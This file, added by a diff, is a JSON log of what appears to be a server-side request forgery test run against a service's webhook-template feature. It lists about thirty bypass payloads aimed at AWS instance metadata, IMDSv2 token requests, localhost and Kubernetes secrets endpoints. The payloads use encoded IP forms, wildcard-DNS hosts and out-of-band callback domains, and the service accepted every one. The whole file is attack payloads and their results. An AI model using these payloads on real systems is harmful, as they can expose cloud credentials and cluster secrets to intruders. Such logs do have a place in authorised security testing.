@@ -1,0 +1,276 @@
+{
+  "oob_domain": "d74ese1gvedfcvsin2nga1hyyksekofcu.oast.me",
+  "results": [
+    {
+      "name": "bypass-decimal-ip",
+      "url": "http://2852039166/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://2852039166/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":"
+    },
+    {
+      "name": "bypass-hex-ip",
+      "url": "http://0xa9fea9fe/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0xa9fea9fe/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":"
+    },
+    {
+      "name": "bypass-octal-ip",
+      "url": "http://0251.0376.0251.0376/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0251.0376.0251.0376/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_i"
+    },
+    {
+      "name": "bypass-hex-dotted",
+      "url": "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_i"
+    },
+    {
+      "name": "bypass-ipv6-mapped",
+      "url": "http://[::ffff:169.254.169.254]/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://[::ffff:169.254.169.254]/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webh"
+    },
+    {
+      "name": "bypass-ipv6-hex",
+      "url": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://[::ffff:a9fe:a9fe]/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is"
+    },
+    {
+      "name": "bypass-nip-io",
+      "url": "http://169.254.169.254.nip.io/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://169.254.169.254.nip.io/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhoo"
+    },
+    {
+      "name": "bypass-sslip-io",
+      "url": "http://169.254.169.254.sslip.io/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://169.254.169.254.sslip.io/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webh"
+    },
+    {
+      "name": "bypass-at-sign",
+      "url": "http://anything@169.254.169.254/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://anything@169.254.169.254/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webh"
+    },
+    {
+      "name": "bypass-mixed-encoding",
+      "url": "http://169.254.0xa9fe/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://169.254.0xa9fe/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kak"
+    },
+    {
+      "name": "bypass-padding-zero",
+      "url": "http://169.254.169.0254/latest/meta-data/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://169.254.169.0254/latest/meta-data/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_k"
+    },
+    {
+      "name": "bypass-localhost-decimal",
+      "url": "http://2130706433/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://2130706433/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":\"69c8e"
+    },
+    {
+      "name": "bypass-localhost-hex",
+      "url": "http://0x7f000001/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0x7f000001/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":\"69c8e"
+    },
+    {
+      "name": "bypass-localhost-octal",
+      "url": "http://0177.0.0.1/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0177.0.0.1/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":\"69c8e"
+    },
+    {
+      "name": "bypass-localhost-zero",
+      "url": "http://0.0.0.0/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0.0.0.0/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":\"69c8ee4e"
+    },
+    {
+      "name": "bypass-localhost-short",
+      "url": "http://0/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":\"69c8ee4f629242"
+    },
+    {
+      "name": "bypass-localhost-ipv6",
+      "url": "http://[::1]/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://[::1]/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":\"69c8ee5064"
+    },
+    {
+      "name": "bypass-localhost-ipv6-mapped",
+      "url": "http://[::ffff:127.0.0.1]/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://[::ffff:127.0.0.1]/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id"
+    },
+    {
+      "name": "bypass-localhost-nip",
+      "url": "http://127.0.0.1.nip.io/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://127.0.0.1.nip.io/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":"
+    },
+    {
+      "name": "bypass-localhost-padding",
+      "url": "http://127.0.0.01/",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://127.0.0.01/\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_is_kakao\":false,\"id\":\"69c8e"
+    },
+    {
+      "name": "bypass-k8s-api",
+      "url": "https://kubernetes.default.svc/api/v1/namespaces",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"https://kubernetes.default.svc/api/v1/namespaces\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webho"
+    },
+    {
+      "name": "bypass-k8s-fqdn",
+      "url": "https://kubernetes.default.svc.cluster.local/api/v1/namespaces",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"https://kubernetes.default.svc.cluster.local/api/v1/namespaces\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_bod"
+    },
+    {
+      "name": "bypass-k8s-secrets",
+      "url": "https://kubernetes.default.svc/api/v1/secrets",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"https://kubernetes.default.svc/api/v1/secrets\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body\":\"{}\",\"webhook_"
+    },
+    {
+      "name": "bypass-redirect-collab",
+      "url": "https://ioaotfq5cntio10oir563kvkdbj27svh.oastify.com/redirect",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"https://ioaotfq5cntio10oir563kvkdbj27svh.oastify.com/redirect\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_body"
+    },
+    {
+      "name": "bypass-imdsv2-decimal",
+      "url": "http://2852039166/latest/api/token",
+      "method": "PUT",
+      "headers": {
+        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+      },
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://2852039166/latest/api/token\",\"webhook_method\":\"PUT\",\"webhook_headers\":{\"X-aws-ec2-metadata-token-ttl-seconds\":\"21600\"},\"webhook_body_type\":\""
+    },
+    {
+      "name": "bypass-imdsv2-nip",
+      "url": "http://169.254.169.254.nip.io/latest/api/token",
+      "method": "PUT",
+      "headers": {
+        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+      },
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://169.254.169.254.nip.io/latest/api/token\",\"webhook_method\":\"PUT\",\"webhook_headers\":{\"X-aws-ec2-metadata-token-ttl-seconds\":\"21600\"},\"webhook_"
+    },
+    {
+      "name": "bypass-imdsv2-hex",
+      "url": "http://0xa9fea9fe/latest/api/token",
+      "method": "PUT",
+      "headers": {
+        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+      },
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://0xa9fea9fe/latest/api/token\",\"webhook_method\":\"PUT\",\"webhook_headers\":{\"X-aws-ec2-metadata-token-ttl-seconds\":\"21600\"},\"webhook_body_type\":\""
+    },
+    {
+      "name": "bypass-imdsv2-ipv6",
+      "url": "http://[::ffff:a9fe:a9fe]/latest/api/token",
+      "method": "PUT",
+      "headers": {
+        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+      },
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"http://[::ffff:a9fe:a9fe]/latest/api/token\",\"webhook_method\":\"PUT\",\"webhook_headers\":{\"X-aws-ec2-metadata-token-ttl-seconds\":\"21600\"},\"webhook_body"
+    },
+    {
+      "name": "bypass-oob-check",
+      "url": "https://bypass-check.d74ese1gvedfcvsin2nga1hyyksekofcu.oast.me",
+      "method": "GET",
+      "headers": {},
+      "save_status": 200,
+      "save_result": "saved",
+      "response": "{\"info\":\"Save completed.\",\"template\":{\"webhook_url\":\"https://bypass-check.d74ese1gvedfcvsin2nga1hyyksekofcu.oast.me\",\"webhook_method\":\"GET\",\"webhook_headers\":{},\"webhook_body_type\":\"json\",\"webhook_bod"
+    }
+  ],
+  "interactions": [],
+  "timestamp": "2026-03-29T09:18:47.457232+00:00"
+}
